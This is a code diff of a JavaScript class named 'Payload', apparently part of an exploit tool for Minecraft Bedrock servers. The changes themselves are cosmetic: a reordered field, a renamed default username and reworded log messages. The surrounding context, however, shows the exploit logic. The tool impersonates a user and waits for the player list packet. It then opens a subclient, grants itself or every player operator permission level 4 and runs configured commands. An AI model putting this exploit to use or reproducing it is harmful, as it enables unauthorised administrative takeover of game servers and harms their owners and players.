@@ -6,8 +6,8 @@ const BinaryStream = require("./BinaryStream.js");
 const config = require("../config.json");
 
 class Payload {
-	subclientId = 1;
 	botName = "ImpersonatedUser"
+	subclientId = 1;
 
 	/**
 	 * @class
@@ -25,7 +25,7 @@ class Payload {
 			port: port,
 			profilesFolder: "./authCache/",
 			offline: offline,
-			// Incase 'offline' is set to true, the offline account will have a username of 'EliteElixir'
+			// Incase 'offline' is set to true, the offline account will have a username of 'Test'
 			username: "Test"
 		});
 
@@ -38,7 +38,7 @@ class Payload {
 		// If the 'opAll' config value is enabled, we will need to wait for the second PlayerList packet
 		this.packetCount++;
 		if(this.packetCount !== 2) return;
-	
+
 		console.log("We managed to get the PlayerList packet, we can now start the exploit");
 
 		this.createSubClient();
@@ -48,13 +48,12 @@ class Payload {
 		for(const player of records) {
 			if(!config.opAll && player.username != this.client.username) continue;
 
-			console.log(`Giving operator to ${player.username}`);
+			console.log(`Updating ${player.username}'s permissions to have Operator`);
 
-			console.log(player.entity_unique_id);
 			this.sendRequestPermissions(player.entity_unique_id, 4);
 		}
 
-		console.log("Running final actions:");
+		console.log("Running final actions...");
 
 		for(const command of config.commands) {
 			this.sendCommandRequest(command);
